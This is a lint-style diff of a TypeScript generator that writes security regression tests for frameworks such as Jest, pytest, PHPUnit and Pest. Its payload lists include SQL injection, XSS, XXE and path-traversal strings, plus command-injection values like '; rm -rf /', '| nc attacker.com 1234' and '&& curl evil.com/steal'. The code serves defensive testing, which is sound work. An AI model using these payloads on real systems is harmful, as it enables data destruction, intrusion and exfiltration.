@@ -607,30 +607,30 @@ export class AdaptiveTestGenerator {
     frameworkInfo?: DetectedFramework
   ): string {
     switch (framework) {
-      case 'vitest':
-        return this.generateVitestTests(testSuite, conventions, vulnerability);
-      case 'mocha':
-        return this.generateMochaTests(testSuite, conventions, vulnerability);
-      case 'pytest':
-        return this.generatePytestTests(testSuite, conventions, vulnerability);
-      case 'rspec':
-        return this.generateRSpecTests(testSuite, conventions, vulnerability);
-      case 'minitest':
-        return this.generateMinitestTests(testSuite, conventions, vulnerability);
-      case 'exunit':
-        return this.generateExUnitTests(testSuite, conventions, vulnerability);
-      case 'phpunit':
-        return this.generatePHPUnitTests(testSuite, conventions, vulnerability, frameworkInfo);
-      case 'pest':
-        return this.generatePestTests(testSuite, conventions, vulnerability, frameworkInfo);
-      case 'jest':
-        return this.generateJestTests(testSuite, conventions, vulnerability);
-      case 'junit5':
-        return this.generateJUnit5Tests(testSuite, conventions, vulnerability);
-      case 'testng':
-        return this.generateTestNGTests(testSuite, conventions, vulnerability);
-      default:
-        return this.generateGenericTestCode(testSuite, vulnerability);
+    case 'vitest':
+      return this.generateVitestTests(testSuite, conventions, vulnerability);
+    case 'mocha':
+      return this.generateMochaTests(testSuite, conventions, vulnerability);
+    case 'pytest':
+      return this.generatePytestTests(testSuite, conventions, vulnerability);
+    case 'rspec':
+      return this.generateRSpecTests(testSuite, conventions, vulnerability);
+    case 'minitest':
+      return this.generateMinitestTests(testSuite, conventions, vulnerability);
+    case 'exunit':
+      return this.generateExUnitTests(testSuite, conventions, vulnerability);
+    case 'phpunit':
+      return this.generatePHPUnitTests(testSuite, conventions, vulnerability, frameworkInfo);
+    case 'pest':
+      return this.generatePestTests(testSuite, conventions, vulnerability, frameworkInfo);
+    case 'jest':
+      return this.generateJestTests(testSuite, conventions, vulnerability);
+    case 'junit5':
+      return this.generateJUnit5Tests(testSuite, conventions, vulnerability);
+    case 'testng':
+      return this.generateTestNGTests(testSuite, conventions, vulnerability);
+    default:
+      return this.generateGenericTestCode(testSuite, vulnerability);
     }
   }
 
@@ -649,7 +649,7 @@ export class AdaptiveTestGenerator {
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `// ERROR: No RED tests found in test suite`;
+      return '// ERROR: No RED tests found in test suite';
     }
 
     // Extract just the test body from the testCode (remove the test wrapper)
@@ -697,7 +697,7 @@ ${testBlocks}
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `// ERROR: No RED tests found in test suite`;
+      return '// ERROR: No RED tests found in test suite';
     }
 
     const imports = assertionLib === 'chai'
@@ -706,9 +706,9 @@ ${testBlocks}
 
     const assertion = assertionLib === 'chai'
       ? (positive: boolean, actual: string, expected: string) =>
-          positive ? `expect(${actual}).to.include(${expected})` : `expect(${actual}).to.not.include(${expected})`
+        positive ? `expect(${actual}).to.include(${expected})` : `expect(${actual}).to.not.include(${expected})`
       : (positive: boolean, actual: string, expected: string) =>
-          positive ? `assert(${actual}.includes(${expected}))` : `assert(!${actual}.includes(${expected}))`;
+        positive ? `assert(${actual}.includes(${expected}))` : `assert(!${actual}.includes(${expected}))`;
 
     // Mocha typically uses 'it' for BDD style
     const testFn = 'it';
@@ -744,7 +744,7 @@ describe("${moduleName.charAt(0).toUpperCase() + moduleName.slice(1)} ${vulnerab
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `# ERROR: No RED tests found in test suite`;
+      return '# ERROR: No RED tests found in test suite';
     }
 
     // Generate test methods for each RED test
@@ -786,7 +786,7 @@ ${testMethods}`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `# ERROR: No RED tests found in test suite`;
+      return '# ERROR: No RED tests found in test suite';
     }
 
     // Generate test blocks for each RED test
@@ -831,7 +831,7 @@ end`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `# ERROR: No RED tests found in test suite`;
+      return '# ERROR: No RED tests found in test suite';
     }
 
     // Generate test contexts for each RED test
@@ -882,7 +882,7 @@ end`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `# ERROR: No RED tests found in test suite`;
+      return '# ERROR: No RED tests found in test suite';
     }
 
     // Generate test blocks for each RED test
@@ -953,7 +953,7 @@ end`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `<?php\n// ERROR: No RED tests found in test suite`;
+      return '<?php\n// ERROR: No RED tests found in test suite';
     }
 
     // Standard PHPUnit with modern features
@@ -1013,7 +1013,7 @@ ${testMethods}
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `// ERROR: No RED tests found in test suite`;
+      return '// ERROR: No RED tests found in test suite';
     }
 
     const testWrapper = conventions.style === 'bdd' ? 'describe' : '';
@@ -1057,7 +1057,7 @@ ${testWrapper ? '});' : ''}`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `// ERROR: No RED tests found in test suite`;
+      return '// ERROR: No RED tests found in test suite';
     }
 
     const imports = `package ${packageName};
@@ -1140,7 +1140,7 @@ ${testMethods}
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `// ERROR: No RED tests found in test suite`;
+      return '// ERROR: No RED tests found in test suite';
     }
 
     // Generate test methods for each RED test
@@ -1155,9 +1155,9 @@ ${testMethods}
             String result = instance.process(maliciousInput);
             assertNotNull(result);
             ${vulnerability.type === VulnerabilityType.XML_EXTERNAL_ENTITIES ?
-            `// If XXE, might contain system file content
+    `// If XXE, might contain system file content
             assertFalse(result.contains("root:"));` :
-            `// Verify the vulnerability is exploitable
+    `// Verify the vulnerability is exploitable
             assertTrue(result != null);`}
         } catch (Exception e) {
             fail("Should not throw exception with vulnerable code");
@@ -1278,8 +1278,8 @@ ${testFunctions}`;
       
       const options: TestGenerationOptions = {
         vulnerabilityType: vulnerability.type,
-        language: language as "javascript" | "typescript" | "python" | "ruby" | "php" | "java" | "elixir",
-        testFramework: (framework?.name || 'jest') as "jest" | "mocha" | "bun" | "cypress",
+        language: language as 'javascript' | 'typescript' | 'python' | 'ruby' | 'php' | 'java' | 'elixir',
+        testFramework: (framework?.name || 'jest') as 'jest' | 'mocha' | 'bun' | 'cypress',
         includeE2E: false
       };
 
@@ -1398,19 +1398,19 @@ ${testFunctions}`;
     const normalizedType = vulnerabilityType.toUpperCase().replace(/-/g, '_');
 
     switch (normalizedType) {
-      case 'SQL_INJECTION':
-        return "'; DROP TABLE users; --";
-      case 'XSS':
-        return '<script>alert("XSS")</script>';
-      case 'COMMAND_INJECTION':
-        return '; cat /etc/passwd';
-      case 'PATH_TRAVERSAL':
-        return '../../../etc/passwd';
-      case 'XML_EXTERNAL_ENTITIES':
-      case 'XXE':
-        return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
-      default:
-        return 'malicious_input';
+    case 'SQL_INJECTION':
+      return '\'; DROP TABLE users; --';
+    case 'XSS':
+      return '<script>alert("XSS")</script>';
+    case 'COMMAND_INJECTION':
+      return '; cat /etc/passwd';
+    case 'PATH_TRAVERSAL':
+      return '../../../etc/passwd';
+    case 'XML_EXTERNAL_ENTITIES':
+    case 'XXE':
+      return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+    default:
+      return 'malicious_input';
     }
   }
 
@@ -1487,16 +1487,16 @@ ${testFunctions}`;
     const ext = fileName.substring(fileName.lastIndexOf('.'));
 
     switch (conventions.fileNaming) {
-      case 'test':
-        return `${dir}/${baseName}.test${ext}`;
-      case 'spec':
-        return `${dir}/${baseName}.spec${ext}`;
-      case '__tests__':
-        return `${dir}/__tests__/${baseName}${ext}`;
-      case 'test_prefix':
-        return `${dir}/test_${baseName}${ext}`;
-      default:
-        return `${dir}/${baseName}.test${ext}`;
+    case 'test':
+      return `${dir}/${baseName}.test${ext}`;
+    case 'spec':
+      return `${dir}/${baseName}.spec${ext}`;
+    case '__tests__':
+      return `${dir}/__tests__/${baseName}${ext}`;
+    case 'test_prefix':
+      return `${dir}/test_${baseName}${ext}`;
+    default:
+      return `${dir}/${baseName}.test${ext}`;
     }
   }
 
@@ -1685,7 +1685,7 @@ ${testFunctions}`;
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `<?php\n// ERROR: No RED tests found in test suite`;
+      return '<?php\n// ERROR: No RED tests found in test suite';
     }
     const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
     const isController = vulnerability.file?.includes('Controller');
@@ -1740,7 +1740,7 @@ ${testMethods}
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `<?php\n// ERROR: No RED tests found in test suite`;
+      return '<?php\n// ERROR: No RED tests found in test suite';
     }
 
     const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
@@ -1790,7 +1790,7 @@ class ${className}${vulnerability.type.replace(/_/g, '')}Test extends WebTestCas
     const redTests = this.extractRedTests(testSuite);
 
     if (redTests.length === 0) {
-      return `<?php\n// ERROR: No RED tests found in test suite`;
+      return '<?php\n// ERROR: No RED tests found in test suite';
     }
 
     const className = vulnerability.file
@@ -1805,7 +1805,7 @@ class ${className}${vulnerability.type.replace(/_/g, '')}Test extends WebTestCas
     const isLaravel = framework?.companions?.includes('laravel');
 
     // Base imports
-    let imports = isLaravel
+    const imports = isLaravel
       ? `use function Pest\\Laravel\\{get, post, put, delete};
 use Illuminate\\Foundation\\Testing\\RefreshDatabase;`
       : `use ${fullClassName};
@@ -1814,32 +1814,32 @@ use App\\Exceptions\\SecurityException;`;
     // Dataset for multiple attack payloads (vulnerability-type specific, not test-suite specific)
     const generateDataset = () => {
       switch (vulnerability.type) {
-        case VulnerabilityType.SQL_INJECTION:
-          return `dataset('malicious_sql', [
+      case VulnerabilityType.SQL_INJECTION:
+        return `dataset('malicious_sql', [
     "' OR '1'='1",
     "'; DROP TABLE users; --",
     "' UNION SELECT * FROM passwords--",
     "admin'--",
     "1' AND '1'='1"
 ]);`;
-        case VulnerabilityType.COMMAND_INJECTION:
-          return `dataset('malicious_commands', [
+      case VulnerabilityType.COMMAND_INJECTION:
+        return `dataset('malicious_commands', [
     "; rm -rf /",
     "| nc attacker.com 1234",
     "\`cat /etc/passwd\`",
     "$(whoami)",
     "&& curl evil.com/steal"
 ]);`;
-        case VulnerabilityType.PATH_TRAVERSAL:
-          return `dataset('path_traversal_payloads', [
+      case VulnerabilityType.PATH_TRAVERSAL:
+        return `dataset('path_traversal_payloads', [
     "../../../etc/passwd",
     "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "....//....//....//etc/passwd",
     "..%252f..%252f..%252fetc%252fpasswd"
 ]);`;
-        default:
-          return '';
+      default:
+        return '';
       }
     };
 
